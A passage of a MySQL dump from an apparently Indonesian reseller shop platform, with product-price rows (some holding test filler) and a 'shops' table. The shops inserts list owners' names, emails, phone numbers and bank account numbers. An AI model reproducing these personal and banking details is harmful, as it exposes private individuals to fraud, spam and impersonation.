(415,15,4,15,237500,60000,'2019-08-16 10:02:46','2019-08-16 10:02:46',NULL,0,'<p><br></p>',1,0),
(416,15,4,16,210000,60000,'2019-08-16 10:03:10','2019-08-16 10:03:10',NULL,0,'<p><br></p>',1,0),
(417,15,4,17,257000,60000,'2019-08-16 10:04:02','2019-08-16 10:04:02',NULL,0,'<p><br></p>',1,0),
(418,15,4,18,230000,60000,'2019-08-16 10:04:27','2019-08-16 10:04:27',NULL,0,'<p><br></p>',1,0),
(419,15,4,19,237000,60000,'2019-08-16 10:04:48','2019-08-16 10:04:48',NULL,0,'<p><br></p>',1,0),
(420,15,4,20,262000,60000,'2019-08-16 10:06:05','2019-08-16 10:06:05',NULL,0,'<p><br></p>',1,0),
(421,15,4,21,282000,60000,'2019-08-16 10:06:40','2019-08-16 10:06:40',NULL,0,'<p><br></p>',1,0),
(422,15,4,22,160000,60000,'2019-08-16 10:06:56','2019-08-16 10:06:56',NULL,0,'<p><br></p>',1,0),
(423,15,4,23,265000,60000,'2019-08-16 10:07:28','2019-08-16 10:07:28',NULL,0,'<p><br></p>',1,0),
(424,15,4,24,275000,60000,'2019-08-16 10:07:59','2019-08-16 10:07:59',NULL,0,'<p><br></p>',1,0),
(425,15,4,25,265000,60000,'2019-08-16 10:08:26','2019-08-16 10:08:26',NULL,0,'<p><br></p>',1,0),
(426,15,4,43,195000,60000,'2019-08-16 10:08:53','2019-08-16 10:08:53',NULL,0,'<p><br></p>',1,0),
(427,15,4,44,195000,60000,'2019-08-16 10:09:38','2019-08-16 10:09:38',NULL,0,'<p><br></p>',1,0),
(428,15,4,49,396000,60000,'2019-08-16 10:10:43','2019-08-16 10:10:43',NULL,0,'<p><br></p>',1,0),
(429,15,4,46,345000,60000,'2019-08-16 10:12:10','2019-08-16 10:12:10',NULL,0,'<p><br></p>',1,0),
(430,41,27,11,283000,40000,'2019-08-18 11:43:47','2019-08-20 11:11:18',NULL,0,'<p>asdfasdfasdfasdfasdf<br></p>',0,0),
(431,41,27,12,285000,150000,'2019-08-18 11:47:22','2019-08-18 11:47:22',NULL,0,'<p><br></p>',1,0),
(432,41,27,13,250000,103000,'2019-08-18 11:53:15','2019-08-18 11:53:15',NULL,0,'<p><br></p>',1,0),
(433,41,27,14,313,50000,'2019-08-18 11:54:54','2019-08-20 13:54:03',NULL,0,'<p><br></p>',0,0),
(434,41,27,15,2320,50000,'2019-08-18 11:55:53','2019-08-20 13:53:12',NULL,0,'<p><br></p>',0,0),
(435,41,27,16,25000,50000,'2019-08-18 11:56:30','2019-08-20 13:55:09',NULL,0,'<p><br></p>',0,0),
(436,41,27,17,252000,50000,'2019-08-18 12:00:37','2019-08-18 12:00:37',NULL,0,'<p><br></p>',1,0),
(437,41,27,18,225000,50000,'2019-08-18 12:01:29','2019-08-18 12:01:29',NULL,0,'<p><br></p>',1,0),
(438,41,27,19,2.222222222222222e134,50000,'2019-08-18 12:11:35','2019-08-20 14:29:57',NULL,0,'<p><br></p>',0,0),
(439,39,25,11,350000,40000,'2019-08-18 14:16:01','2019-08-18 14:16:01',NULL,0,'<p>asdfasdfasdfasdfasdf<br></p>',1,0),
(440,39,25,50,300000,25000,'2019-08-18 14:16:58','2019-08-18 14:16:58',NULL,0,'<p><br></p>',1,0),
(441,22,11,44,165000,25000,'2019-08-18 15:17:36','2019-08-18 15:17:36',NULL,0,'<p><br></p>',1,0),
(442,22,11,33,51000,10000,'2019-08-18 15:18:55','2019-08-18 15:18:55',NULL,0,'<p><br></p>',1,0),
(443,22,11,34,51000,10000,'2019-08-18 15:19:11','2019-08-18 15:19:11',NULL,0,'<p><br></p>',1,0),
(444,22,11,36,106000,25000,'2019-08-18 15:19:28','2019-08-18 15:19:28',NULL,0,'<p><br></p>',1,0),
(445,22,11,37,140000,25000,'2019-08-18 15:19:48','2019-08-18 15:19:48',NULL,0,'<p>testt test test test<br></p>',1,0),
(446,22,11,43,170000,30000,'2019-08-18 15:20:05','2019-08-18 15:20:05',NULL,0,'<p><br></p>',1,0),
(447,41,27,20,257000,50000,'2019-08-19 01:33:34','2019-08-19 01:33:34',NULL,0,'<p><br></p>',1,0),
(448,41,27,21,277000,50000,'2019-08-19 01:33:58','2019-08-19 01:33:58',NULL,0,'<p><br></p>',1,0),
(449,41,27,22,155000,50000,'2019-08-19 01:34:43','2019-08-19 01:34:43',NULL,0,'<p><br></p>',1,0),
(450,41,27,23,260000,50000,'2019-08-19 01:35:14','2019-08-19 01:35:14',NULL,0,'<p><br></p>',1,0),
(451,41,27,24,270000,50000,'2019-08-19 01:36:03','2019-08-19 01:36:03',NULL,0,'<p><br></p>',1,0),
(452,41,27,25,260000,50000,'2019-08-19 01:36:31','2019-08-19 01:36:31',NULL,0,'<p><br></p>',1,0),
(453,41,27,26,323000,50000,'2019-08-19 01:37:15','2019-08-19 01:37:15',NULL,0,'<p><strong>​​​​​​​</strong><br></p>',1,0),
(454,41,27,27,270000,50000,'2019-08-19 01:37:49','2019-08-19 01:37:49',NULL,0,'<p><br></p>',1,0),
(455,41,27,32,51000,10000,'2019-08-19 01:38:21','2019-08-19 01:38:21',NULL,0,'<p><br></p>',1,0),
(456,41,27,33,51000,10000,'2019-08-19 01:38:43','2019-08-19 01:38:43',NULL,0,'<p><br></p>',1,0),
(457,41,27,34,51000,10000,'2019-08-19 01:39:05','2019-08-19 01:39:05',NULL,0,'<p><br></p>',1,0),
(458,41,27,35,195000,40000,'2019-08-19 01:40:03','2019-08-19 01:40:03',NULL,0,'<p><br></p>',1,0),
(459,41,27,36,106000,25000,'2019-08-19 01:40:36','2019-08-19 01:40:36',NULL,0,'<p><br></p>',1,0),
(460,41,27,37,140000,25000,'2019-08-19 01:41:57','2019-08-19 01:41:57',NULL,0,'<p>testt test test test<br></p>',1,0),
(461,41,27,43,170000,30000,'2019-08-19 01:43:18','2019-08-19 01:43:18',NULL,0,'<p><br></p>',1,0),
(462,41,27,44,165000,25000,'2019-08-19 01:43:49','2019-08-19 01:43:49',NULL,0,'<p><br></p>',1,0),
(463,42,28,11,283000,40000,'2019-08-19 05:20:44','2019-08-19 05:20:44',NULL,0,'<p>asdfasdfasdfasdfasdf<br></p>',1,0),
(464,42,28,12,185000,50000,'2019-08-19 05:31:18','2019-08-19 05:31:18',NULL,0,'<p><br></p>',1,0),
(465,42,28,13,197000,50000,'2019-08-19 05:31:32','2019-08-19 05:31:32',NULL,0,'<p><br></p>',1,0),
(466,42,28,14,313000,50000,'2019-08-19 05:31:44','2019-08-19 05:31:44',NULL,0,'<p><br></p>',1,0),
(467,42,28,15,232000,50000,'2019-08-19 05:31:58','2019-08-19 05:31:58',NULL,0,'<p><br></p>',1,0),
(468,42,28,16,205000,50000,'2019-08-19 05:32:11','2019-08-19 05:32:11',NULL,0,'<p><br></p>',1,0),
(469,42,28,17,252000,50000,'2019-08-19 05:32:22','2019-08-19 05:32:22',NULL,0,'<p><br></p>',1,0),
(470,42,28,18,225000,50000,'2019-08-19 05:32:48','2019-08-19 05:32:48',NULL,0,'<p><br></p>',1,0),
(471,42,28,21,277000,50000,'2019-08-19 05:33:39','2019-08-19 05:33:39',NULL,0,'<p><br></p>',1,0),
(472,42,28,22,155000,50000,'2019-08-19 05:35:17','2019-08-19 05:35:17',NULL,0,'<p><br></p>',1,0),
(473,42,28,20,257000,50000,'2019-08-19 05:35:38','2019-08-19 05:35:38',NULL,0,'<p><br></p>',1,0),
(474,42,28,19,232000,50000,'2019-08-19 05:35:55','2019-08-19 05:35:55',NULL,0,'<p><br></p>',1,0),
(475,42,28,28,358000,50000,'2019-08-19 05:37:40','2019-08-19 05:37:40',NULL,0,'<p><br></p>',1,0),
(476,42,28,36,106000,25000,'2019-08-19 05:38:00','2019-08-19 05:38:00',NULL,0,'<p><br></p>',1,0),
(477,42,28,37,140000,25000,'2019-08-19 05:38:26','2019-08-19 05:38:26',NULL,0,'<p>testt test test test<br></p>',1,0),
(478,42,28,47,285000,30000,'2019-08-19 05:39:13','2019-08-19 05:39:13',NULL,0,'<p><br></p>',1,0),
(479,42,28,35,195000,40000,'2019-08-19 05:40:00','2019-08-19 05:40:00',NULL,0,'<p><br></p>',1,0),
(480,42,28,44,165000,25000,'2019-08-19 05:40:20','2019-08-19 05:40:20',NULL,0,'<p><br></p>',1,0),
(481,42,28,45,318000,40000,'2019-08-19 05:40:56','2019-08-19 05:40:56',NULL,0,'<p><br></p>',1,0),
(482,42,28,46,320000,30000,'2019-08-19 05:41:13','2019-08-19 05:41:13',NULL,0,'<p><br></p>',1,0),
(483,42,28,31,260000,50000,'2019-08-19 05:41:29','2019-08-19 05:41:29',NULL,0,'<p><br></p>',1,0),
(484,42,28,23,260000,50000,'2019-08-19 05:41:58','2019-08-19 05:41:58',NULL,0,'<p><br></p>',1,0),
(485,42,28,24,270000,50000,'2019-08-19 05:42:17','2019-08-19 05:42:17',NULL,0,'<p><br></p>',1,0),
(486,42,28,25,260000,50000,'2019-08-19 05:42:32','2019-08-19 05:42:32',NULL,0,'<p><br></p>',1,0),
(487,42,28,26,323000,50000,'2019-08-19 05:42:46','2019-08-19 05:42:46',NULL,0,'<p><strong>​​​​​​​</strong><br></p>',1,0),
(488,21,10,20,257000,50000,'2019-08-20 09:58:57','2019-08-20 09:58:57',NULL,0,'<p><br></p>',1,0),
(489,29,15,11,283000,40000,'2019-08-20 10:07:31','2019-08-20 10:07:31',NULL,0,'<p>asdfasdfasdfasdfasdf<br></p>',1,0),
(490,29,15,12,185000,50000,'2019-08-20 10:12:04','2019-08-20 10:12:04',NULL,0,'<p><br></p>',1,0),
(491,29,15,13,197000,50000,'2019-08-20 10:12:09','2019-08-20 10:12:09',NULL,0,'<p><br></p>',1,0),
(492,29,15,14,313000,50000,'2019-08-20 10:12:29','2019-08-20 10:12:29',NULL,0,'<p><br></p>',1,0),
(493,29,15,15,232000,50000,'2019-08-20 10:12:39','2019-08-20 10:12:39',NULL,0,'<p><br></p>',1,0),
(494,29,15,16,205000,50000,'2019-08-20 10:12:50','2019-08-20 10:12:50',NULL,0,'<p><br></p>',1,0),
(495,29,15,17,252000,50000,'2019-08-20 10:18:07','2019-08-20 10:18:07',NULL,0,'<p><br></p>',1,0),
(496,29,15,18,225000,50000,'2019-08-20 10:18:19','2019-08-20 10:18:19',NULL,0,'<p><br></p>',1,0),
(497,29,15,19,232000,50000,'2019-08-20 10:18:31','2019-08-20 10:18:31',NULL,0,'<p><br></p>',1,0),
(498,29,15,20,257000,50000,'2019-08-20 10:18:40','2019-08-20 10:18:40',NULL,0,'<p><br></p>',1,0),
(499,29,15,21,277000,50000,'2019-08-20 10:18:50','2019-08-20 10:18:50',NULL,0,'<p><br></p>',1,0),
(500,29,15,22,155000,50000,'2019-08-20 10:19:00','2019-08-20 10:19:00',NULL,0,'<p><br></p>',1,0),
(501,29,15,23,260000,50000,'2019-08-20 10:19:09','2019-08-20 10:19:09',NULL,0,'<p><br></p>',1,0),
(502,29,15,24,270000,50000,'2019-08-20 10:19:33','2019-08-20 10:19:33',NULL,0,'<p><br></p>',1,0),
(503,29,15,25,260000,50000,'2019-08-20 10:19:42','2019-08-20 10:19:42',NULL,0,'<p><br></p>',1,0),
(504,29,15,26,323000,50000,'2019-08-20 10:20:11','2019-08-20 10:20:11',NULL,0,'<p><strong>​​​​​​​</strong><br></p>',1,0),
(505,29,15,27,270000,50000,'2019-08-20 10:20:19','2019-08-20 10:20:19',NULL,0,'<p><br></p>',1,0),
(506,29,15,28,358000,50000,'2019-08-20 10:20:33','2019-08-20 10:20:33',NULL,0,'<p><br></p>',1,0),
(507,29,15,29,330000,50000,'2019-08-20 10:20:40','2019-08-20 10:20:40',NULL,0,'<p><br></p>',1,0),
(508,29,15,30,270000,50000,'2019-08-20 10:20:50','2019-08-20 10:20:50',NULL,0,'<p><br></p>',1,0),
(509,29,15,31,260000,50000,'2019-08-20 10:25:37','2019-08-20 10:25:37',NULL,0,'<p><br></p>',1,0),
(510,29,15,32,51000,10000,'2019-08-20 10:25:45','2019-08-20 10:30:18',NULL,0,'<p><br></p>',1,0),
(511,29,15,33,51000,10000,'2019-08-20 10:25:56','2019-08-20 10:25:56',NULL,0,'<p><br></p>',1,0),
(512,29,15,34,51000,10000,'2019-08-20 10:27:24','2019-08-20 10:27:24',NULL,0,'<p><br></p>',1,0),
(513,29,15,35,195000,40000,'2019-08-20 10:27:41','2019-08-20 10:30:07',NULL,0,'<p><br></p>',1,0),
(514,41,27,50,280000,25000,'2019-08-20 14:33:04','2019-08-20 14:33:04',NULL,0,'<p><br></p>',1,0),
(515,41,27,47,285000,30000,'2019-08-20 14:33:35','2019-08-20 14:33:35',NULL,0,'<p><br></p>',1,0),
(516,41,27,48,207000,25000,'2019-08-20 14:34:02','2019-08-20 14:34:02',NULL,0,'<p><br></p>',1,0),
(517,37,23,20,300000,98000,'2019-08-21 04:25:12','2019-08-21 04:25:12',NULL,0,'<p><br></p>',1,0),
(518,37,23,26,350000,82000,'2019-08-21 04:26:03','2019-08-21 04:26:03',NULL,0,'<p><strong>​​​​​​​</strong><br></p>',1,0),
(519,37,23,49,400000,64000,'2019-08-21 04:27:12','2019-08-21 04:27:12',NULL,0,'<p><br></p>',1,0),
(520,37,23,45,340000,67000,'2019-08-21 04:28:01','2019-08-21 04:28:01',NULL,0,'<p><br></p>',1,0),
(521,37,23,46,340000,55000,'2019-08-21 04:28:16','2019-08-21 04:28:16',NULL,0,'<p><br></p>',1,0),
(522,37,23,19,275000,98000,'2019-08-21 04:30:27','2019-08-21 04:30:27',NULL,0,'<p><br></p>',1,0),
(523,43,29,11,278000,40000,'2019-08-22 02:30:29','2019-08-22 02:30:29',NULL,0,'<p>asdfasdfasdfasdfasdf<br></p>',1,0),
(524,43,29,12,180000,50000,'2019-08-22 02:30:49','2019-08-22 02:30:49',NULL,0,'<p><br></p>',1,0),
(525,43,29,13,192000,50000,'2019-08-22 02:31:11','2019-08-22 02:31:11',NULL,0,'<p><br></p>',1,0),
(526,43,29,15,227500,50000,'2019-08-22 02:31:57','2019-08-22 02:31:57',NULL,0,'<p><br></p>',1,0),
(527,43,29,17,247000,50000,'2019-08-22 02:32:12','2019-08-22 02:32:12',NULL,0,'<p><br></p>',1,0),
(528,43,29,18,220000,50000,'2019-08-22 02:32:52','2019-08-22 02:32:52',NULL,0,'<p><br></p>',1,0),
(529,43,29,20,252000,50000,'2019-08-22 02:33:22','2019-08-22 02:33:22',NULL,0,'<p><br></p>',1,0),
(530,43,29,25,255000,50000,'2019-08-22 02:34:19','2019-08-22 02:34:19',NULL,0,'<p><br></p>',1,0),
(531,43,29,29,325000,50000,'2019-08-22 02:35:08','2019-08-22 02:35:08',NULL,0,'<p><br></p>',1,0),
(532,43,29,27,265000,50000,'2019-08-22 02:35:41','2019-08-22 02:35:41',NULL,0,'<p><br></p>',1,0),
(533,43,29,35,190000,40000,'2019-08-22 02:36:50','2019-08-22 02:36:50',NULL,0,'<p><br></p>',1,0),
(534,43,29,36,105000,29000,'2019-08-22 02:37:18','2019-08-22 02:37:18',NULL,0,'<p><br></p>',1,0),
(535,43,29,37,135000,25000,'2019-08-22 02:38:08','2019-08-22 02:38:08',NULL,0,'<p>testt test test test<br></p>',1,0),
(536,43,29,45,315000,42000,'2019-08-22 02:39:58','2019-08-22 02:39:58',NULL,0,'<p><br></p>',1,0),
(537,43,29,46,320000,35000,'2019-08-22 02:40:35','2019-08-22 02:40:35',NULL,0,'<p><br></p>',1,0),
(538,43,29,47,285000,35000,'2019-08-22 02:41:04','2019-08-22 02:41:04',NULL,0,'<p><br></p>',1,0),
(539,43,29,52,300000,25000,'2019-08-22 02:41:37','2019-08-22 02:41:37',NULL,0,'<p><br></p>',1,0),
(540,43,29,49,368000,32000,'2019-08-22 02:43:26','2019-08-22 02:43:26',NULL,0,'<p><br></p>',1,0),
(541,43,29,48,205000,28000,'2019-08-22 02:44:19','2019-08-22 02:44:19',NULL,0,'<p><br></p>',1,0),
(542,43,29,26,318000,50000,'2019-08-22 02:47:31','2019-08-22 02:47:31',NULL,0,'<p><strong>​​​​​​​</strong><br></p>',1,0),
(543,43,29,19,227000,50000,'2019-08-22 02:50:43','2019-08-22 02:50:43',NULL,0,'<p><br></p>',1,0),
(544,43,29,16,200000,50000,'2019-08-22 02:51:46','2019-08-22 02:51:46',NULL,0,'<p><br></p>',1,0),
(545,43,29,43,165000,30000,'2019-08-22 02:52:57','2019-08-22 02:52:57',NULL,0,'<p><br></p>',1,0),
(546,43,29,23,255000,50000,'2019-08-22 03:00:58','2019-08-22 03:00:58',NULL,0,'<p><br></p>',1,0),
(547,43,29,24,265000,50000,'2019-08-22 03:08:59','2019-08-22 03:08:59',NULL,0,'<p><br></p>',1,0),
(548,43,29,28,353000,50000,'2019-08-22 03:12:11','2019-08-22 03:12:11',NULL,0,'<p><br></p>',1,0),
(549,43,29,22,150000,50000,'2019-08-22 16:13:14','2019-08-22 16:13:14',NULL,0,'<p><br></p>',1,0),
(550,43,29,31,255000,50000,'2019-08-22 16:14:58','2019-08-22 16:14:58',NULL,0,'<p><br></p>',1,0),
(551,43,29,44,160000,25000,'2019-08-22 16:16:06','2019-08-22 16:16:06',NULL,0,'<p><br></p>',1,0),
(552,17,6,12,185000,50000,'2019-08-23 20:00:22','2019-08-23 20:00:22',NULL,0,'<p><br></p>',1,0),
(553,28,14,17,267000,70000,'2019-08-24 09:16:46','2019-08-24 09:16:46',NULL,0,'<p><br></p>',1,0),
(554,36,22,48,202000,25000,'2019-08-28 15:08:12','2019-08-28 15:08:12',NULL,0,'<p><br></p>',1,0),
(555,36,22,13,192000,50000,'2019-08-28 15:08:22','2019-08-28 15:08:22',NULL,0,'<p><br></p>',1,0),
(556,36,22,14,308000,50000,'2019-08-28 15:08:41','2019-08-28 15:08:41',NULL,0,'<p><br></p>',1,0),
(557,36,22,20,252000,50000,'2019-08-28 15:08:50','2019-08-28 15:08:50',NULL,0,'<p><br></p>',1,0),
(558,36,22,22,150000,50000,'2019-08-28 15:08:59','2019-08-28 15:08:59',NULL,0,'<p><br></p>',1,0),
(559,36,22,50,275000,25000,'2019-08-28 15:09:34','2019-08-28 15:09:34',NULL,0,'<p><br></p>',1,0),
(560,36,22,49,366000,30000,'2019-08-28 15:10:18','2019-08-28 15:10:18',NULL,0,'<p><br></p>',1,0),
(561,36,22,15,227500,50000,'2019-08-28 15:10:27','2019-08-28 15:10:27',NULL,0,'<p><br></p>',1,0),
(562,36,22,16,200000,50000,'2019-08-28 15:10:36','2019-08-28 15:10:36',NULL,0,'<p><br></p>',1,0),
(563,36,22,18,220000,50000,'2019-08-28 15:10:44','2019-08-28 15:10:44',NULL,0,'<p><br></p>',1,0),
(564,36,22,32,46000,10000,'2019-08-28 15:10:53','2019-08-28 15:10:53',NULL,0,'<p><br></p>',1,0),
(565,36,22,17,247000,50000,'2019-08-28 15:11:02','2019-08-28 15:11:02',NULL,0,'<p><br></p>',1,0),
(566,36,22,19,227000,50000,'2019-08-28 15:11:13','2019-08-28 15:11:13',NULL,0,'<p><br></p>',1,0),
(567,36,22,21,272000,50000,'2019-08-28 15:11:24','2019-08-28 15:11:24',NULL,0,'<p><br></p>',1,0),
(568,36,22,23,255000,50000,'2019-08-28 15:11:36','2019-08-28 15:11:36',NULL,0,'<p><br></p>',1,0),
(569,36,22,33,46000,10000,'2019-08-28 15:12:04','2019-08-28 15:12:04',NULL,0,'<p><br></p>',1,0),
(570,36,22,51,308000,25000,'2019-08-28 15:12:22','2019-08-28 15:12:22',NULL,0,'<p><br></p>',1,0),
(571,37,23,13,200000,58000,'2019-08-28 15:14:05','2019-08-28 15:14:05',NULL,0,'<p><br></p>',1,0),
(572,47,33,25,260000,50000,'2019-08-28 15:38:29','2019-08-28 15:38:29',NULL,0,'<p><br></p>',1,0),
(573,17,6,17,300000,98000,'2019-08-28 16:35:45','2019-08-28 16:35:45',NULL,0,'<p><br></p>',1,0),
(574,17,6,14,350000,87000,'2019-08-28 16:40:44','2019-08-28 16:40:44',NULL,0,'<p><br></p>',1,0),
(575,17,6,15,290000,108000,'2019-08-28 16:41:03','2019-08-28 16:41:03',NULL,0,'<p><br></p>',1,0),
(576,17,6,18,250000,75000,'2019-08-28 16:41:33','2019-08-28 16:41:33',NULL,0,'<p><br></p>',1,0),
(577,17,6,19,250000,68000,'2019-08-28 16:42:00','2019-08-28 16:42:00',NULL,0,'<p><br></p>',1,0),
(578,17,6,20,280000,73000,'2019-08-28 16:42:26','2019-08-28 16:42:26',NULL,0,'<p><br></p>',1,0),
(579,17,6,21,290000,63000,'2019-08-28 16:42:47','2019-08-28 16:42:47',NULL,0,'<p><br></p>',1,0),
(580,17,6,22,155000,50000,'2019-08-28 16:43:14','2019-08-28 16:43:14',NULL,0,'<p><br></p>',1,0),
(581,17,6,45,320000,42000,'2019-08-28 16:43:58','2019-08-28 16:43:58',NULL,0,'<p><br></p>',1,0),
(582,17,6,49,390000,49000,'2019-08-28 16:44:56','2019-08-28 16:44:56',NULL,0,'<p><br></p>',1,0),
(583,17,6,47,300000,45000,'2019-08-28 16:45:14','2019-08-28 16:45:14',NULL,0,'<p><br></p>',1,0),
(584,17,6,48,210000,28000,'2019-08-28 16:45:37','2019-08-28 16:45:37',NULL,0,'<p><br></p>',1,0),
(585,17,6,50,300000,45000,'2019-08-28 16:46:18','2019-08-28 16:46:18',NULL,0,'<p><br></p>',1,0),
(586,17,6,46,320000,30000,'2019-08-28 16:47:11','2019-08-28 16:47:11',NULL,0,'<p><br></p>',1,0),
(587,49,34,11,350000,112000,'2019-08-29 13:15:31','2019-08-29 13:15:31',NULL,0,'<strong></strong><p>Tampil standout dengan Gamis terbaru dari Azeeza. Long dress berdesain modern dengan aplikasi ruffle yang memikat untuk anda Muslimah penuh semangat</p><p>Materials<br>Bubblepop</p><p>Fitur<br>•&nbsp;&nbsp; &nbsp;Dibuat dari material bubblepop, tebal namun terasa ringan saat dipakai. Anda akan merasa &nbsp; &nbsp;nyaman dan bebas bergerak saat memakainya.<br>•&nbsp;&nbsp; &nbsp;Terdapat zipper pada bagian depan yang busui friendly<br>•&nbsp;&nbsp; &nbsp;Terdapat karet pada bagian ujung lengan agar memudahkan anda saat berwudhu.<br>•&nbsp;&nbsp; &nbsp;Pada bagian dalam gamis dilapisi furing berbahan halus sehingga terasa adem dan nyaman saat dipakai seharian.<br>•&nbsp;&nbsp; &nbsp;Desain dengan rempel pada bagian depan hijab dan bagian bawah gamis membuat anda terlihat lebih menarik saat memakai gamis ini.<br>•&nbsp;&nbsp; &nbsp;Tersedia dalam bberbagai warna yang sedang trend yang dapat anda pilih.<br>•&nbsp;&nbsp; &nbsp;Ukuran all size, bisa dipakai oleh siapa saja.</p><p>##### Tinggi/Berat Badan Model<br>173cm/51kg</p><strong></strong>',1,0);

/*Table structure for table `shops` */

DROP TABLE IF EXISTS `shops`;

CREATE TABLE `shops` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` bigint(20) NOT NULL,
  `domain` varchar(99) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `company_name` varchar(159) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `email` varchar(199) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `phone` varchar(19) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `no_rekening` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `nama_pemilik` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `nama_bank` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` enum('active','inactive') COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'active',
  `reseller_package_id` bigint(20) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `logo` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `favicon` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=37 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*Data for the table `shops` */

insert  into `shops`(`id`,`user_id`,`domain`,`company_name`,`email`,`phone`,`no_rekening`,`nama_pemilik`,`nama_bank`,`status`,`reseller_package_id`,`created_at`,`updated_at`,`logo`,`favicon`) values 
(2,10,'https://kitakitaja.com','Ultimate Shop A','muhardin@gmail.com','81372823564','129282828','Muhardin','BCA','active',NULL,'2019-07-30 06:30:35','2019-08-29 01:39:49','logo-1567017319.jpg','favicon-1567017589.jpg'),
(4,15,'https://jakacollection.com','Jaka Collection','jaka_forget@yahoo.co.id','085101231962','1090095037222','Jaka Pramana','Bank Mandiri','active',NULL,'2019-08-05 07:13:03','2019-08-05 07:13:03',NULL,NULL),
(5,16,'https://butikayu.com','Butik Ayu','aarini31@gmail.com','081270686998','109','Ayu Arini','Bank Mandiri','active',NULL,'2019-08-05 08:01:33','2019-08-05 08:01:33',NULL,NULL),
(6,17,'https://lapakjeje.com','lapak jeje','thewritetalk@gmail.com','08117767441','0612381516','wito saputro','bca','active',3,'2019-08-05 09:32:20','2019-08-06 08:47:31',NULL,NULL),
(8,19,'https://shopme.id','Shopme','harnadi.fnu@gmail.com','081310009657','061-3177-253','harnadi','bca','active',4,'2019-08-05 09:36:25','2019-08-05 12:47:43',NULL,NULL),
(9,20,'https://collaborationolshop.com','collaboration','andi.merni@yahoo.com','081261713090','076-8755-970','andi merni','bni syariah','active',3,'2019-08-05 09:38:01','2019-08-05 10:38:19',NULL,NULL),
(10,21,'https://guavastore.com','Guava Store','azlandedi@gmail.com','085356563219','7026-5223-7300','dedi azelan','cimb niaga','active',3,'2019-08-05 09:39:51','2019-08-29 14:12:13','logo-1567062733.png','favicon-1567062733.png'),
(11,22,'https://operstuff.com','oper stuff','okta.perkasa@yahoo.co.id','08156404590','733-0747-042','Okta Perkasa','bca','active',3,'2019-08-05 09:41:57','2019-08-05 10:50:18',NULL,NULL),
(12,26,'https://mfbutik.com','mf butik','xiongkho@gmail.com','081270690000','340-368-1853','ruby','bca','active',3,'2019-08-05 09:47:15','2019-08-05 10:51:52',NULL,NULL),
(13,27,'https://malilashop.com','malila shop','rachma_28@yahoo.com','081270784268','833-5197-727','rachmayati','bca','active',3,'2019-08-05 09:48:45','2019-08-05 10:50:41',NULL,NULL),
(14,28,'https://khanzashop.com','khanza shop','defriputra1@gmail.com','081277641354','055-2689-874','Defrizon Putra','bni','active',4,'2019-08-05 09:50:15','2019-08-07 01:52:01',NULL,NULL),
(15,29,'https://anatawashop.com','Anatawa Shop','anatawa.grup@gmail.com','081916225336','669-0213-930','luh ketut tri yani novita','bca','active',3,'2019-08-05 09:51:59','2019-08-20 02:01:41',NULL,NULL),
(16,30,'https://angeldeamorcollection.com','angel de amor collection','robertssonssylvia80@gmail.com','082283777762','852-002-3144','Sylvia Zumarita','bca','active',3,'2019-08-05 10:05:48','2019-08-05 10:53:36',NULL,NULL),
(17,31,'https://thaniacollection.com','thania collection','niaemma00@gmail.com','082284887424','0139781644','najmiah','BNI','active',3,'2019-08-05 10:07:53','2019-08-05 10:49:34',NULL,NULL),
(18,32,'https://garsastore.com','garsa store','gardangcf@gmail.com','08117779947','0621-0103-4319-506','Gardang Simbolon','bri','active',4,'2019-08-05 10:17:22','2019-08-06 08:06:43',NULL,NULL),
(19,33,'https://joeysynchen.com','joey synchen','joey.synchen@gmail.com','08117777228','061-1618-637','Susyana','bca','active',3,'2019-08-05 10:18:58','2019-08-05 10:53:07',NULL,NULL),
(20,34,'https://Filiryastore.com','filirya store','nurviraalyadewi@gmail.com','081261048361','0621-0103-5586-504','sri hayati','bri','active',4,'2019-08-05 10:21:57','2019-08-06 04:39:41',NULL,NULL),
(21,35,'https://faifaistore.com','faifai store','ridhaprodgi@gmail.com','089623502788','553-0262-253','Maya Ridha','bca','active',4,'2019-08-05 10:25:08','2019-08-09 03:23:24',NULL,NULL),
(22,36,'https://engleestore.com','englee store','tahulendingenglini@gmail.com','082288995100','833-5176-771','englini','bca','active',4,'2019-08-05 10:31:00','2019-08-08 04:57:53',NULL,NULL),
(23,37,'https://resnistore.id','Resni Store','resni.monex@gmail.com','081396317184','852-0301-225','resni situmorang','bca','active',4,'2019-08-05 10:36:32','2019-08-21 04:01:38',NULL,NULL),
(24,38,'https://balismartstore.com','Bali Smart Store','abimanyu100976@gmail.com','081338441127','611-0218-531','I dewa made anom','bca','active',3,'2019-08-05 10:45:06','2019-08-14 08:16:24',NULL,NULL),
(25,39,'https://cnqcollection.com','cnq collection','lucianaluciana341.ll@gmail.com','085668771774','340-3480-459','340-3480-459','bca','active',4,'2019-08-05 12:12:47','2019-08-05 12:15:44',NULL,NULL),
(26,40,'https://virginplaza.com','virgin plaza','virgin_talk88@gmail.com','081809000688','040-1866-808','Robi pangestu','bca','active',NULL,'2019-08-05 13:04:16','2019-08-05 13:04:16',NULL,NULL),
(27,41,'https://gopi-store.com','gopi store','suar41@gmail.com','081917211465','236-0235-125','I ketut suardika','bca','active',NULL,'2019-08-05 13:07:14','2019-08-29 20:06:52','logo-1567083997.jpg','favicon-1567084012.jpg'),
(28,42,'https://deva7store.com','Deva Store','wayanwirawan2016@gmail.com','081999470038','deva7store.com','Wawan wirawan','bca','active',3,'2019-08-05 13:09:49','2019-08-16 03:26:07',NULL,NULL),
(29,43,'https://delanostore.com','Delano Store','lahagu_ardi@yahoo.com','081270298855','061-3192-643','Ardianto Lahagu','bca','active',4,'2019-08-06 06:32:04','2019-08-16 07:33:59',NULL,NULL),
